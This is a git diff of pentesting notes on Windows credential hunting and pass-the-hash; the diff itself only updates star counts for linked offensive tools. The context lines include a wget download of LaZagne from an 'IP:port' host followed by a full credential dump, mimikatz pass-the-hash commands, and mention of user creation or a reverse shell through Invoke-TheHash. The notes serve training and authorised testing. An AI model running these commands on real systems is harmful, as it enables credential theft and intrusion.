@@ -145,8 +145,8 @@ Additional references
 * [LOLBAS](https://lolbas-project.github.io/#) <small>(6.3k ⭐)</small> 
 * [hijacklibs](https://hijacklibs.net/) <small>(0.5k ⭐)</small>
 * [frizb](https://github.com/frizb/Windows-Privilege-Escalation) <small>(0.8k ⭐, checklist, 2020 🪦)</small>
-* [Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) <small>(1.2k ⭐, 2022 🪦)</small>
-* [SharpCollection](https://github.com/Flangvik/SharpCollection) <small>(2.3k ⭐, compiled C# projects)</small>
+* [Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) <small>(1.3k ⭐, 2022 🪦)</small>
+* [SharpCollection](https://github.com/Flangvik/SharpCollection) <small>(2.4k ⭐, compiled C# projects)</small>
 * [Creds](https://github.com/S3cur3Th1sSh1t/Creds) <small>(1.1k ⭐, Windows Pentest Kit)</small>
 * [m0chan 2019 checklist](https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html)
 </div><div>
@@ -213,29 +213,29 @@ Always put yourself in the target shoes.
 [![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
 [![windows_privilege_escalation](../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
 
-You can use [LaZagne](https://github.com/AlessandroZ/LaZagne) <small>(9.5k ⭐)</small>.
+You can use [LaZagne](https://github.com/AlessandroZ/LaZagne) <small>(9.8k ⭐)</small>.
 
 ```ps
 PS> wget IP:port/LaZagne.exe -UseBasicParsing -O LaZagne.exe
 PS> .\LaZagne.exe all
 ```
 
-You can use [Snaffler](https://github.com/SnaffCon/Snaffler) <small>(2.0k ⭐)</small> to find juicy files on your host and every available share on the network.
+You can use [Snaffler](https://github.com/SnaffCon/Snaffler) <small>(2.3k ⭐)</small> to find juicy files on your host and every available share on the network.
 
 ```ps
 PS> Snaffler.exe -s -d domain -o snaffler.log -v data
 <#press enter multiples times if stdout stuck#>
 ```
 
-You can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) <small>(1.2k ⭐, 2018 🪦)</small>.
+You can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) <small>(1.3k ⭐, 2018 🪦)</small>.
 
 ```ps
 PS> Import-Module .\SessionGopher.ps1
 ```
 
-You can use [MailSniper](https://github.com/dafthack/MailSniper) <small>(2.9k ⭐, 2022 🪦)</small> for automated scans of sensitive information in a Microsoft Exchange environment.
+You can use [MailSniper](https://github.com/dafthack/MailSniper) <small>(3.0k ⭐, 2022 🪦)</small> for automated scans of sensitive information in a Microsoft Exchange environment.
 
-You can use [truffleHog](https://github.com/trufflesecurity/truffleHog) <small>(16.0k ⭐)</small> for GIT repositories.
+You can use [truffleHog](https://github.com/trufflesecurity/truffleHog) <small>(18.4k ⭐)</small> for GIT repositories.
 
 #### Linux CredHunting Notes
 
@@ -418,7 +418,7 @@ mimikatz# sekurlsa::pth /user:xxx /rc4:XXX /domain:example.com /run:cmd.exe
 mimikatz# sekurlsa::pth /user:xxx /ntlm:XXX /domain:example.com /run:cmd.exe
 ```
 
-* We can use the [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) <small>(1.5k ⭐, 2018 🪦)</small> script suite on Windows. We can use it to create a user on the target, if we have admin access onto the target. Otherwise, pop a reverse shell.
+* We can use the [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) <small>(1.6k ⭐, 2018 🪦)</small> script suite on Windows. We can use it to create a user on the target, if we have admin access onto the target. Otherwise, pop a reverse shell.
 
 ```shell!
 PS> Import-Module .\Invoke-TheHash.psd1
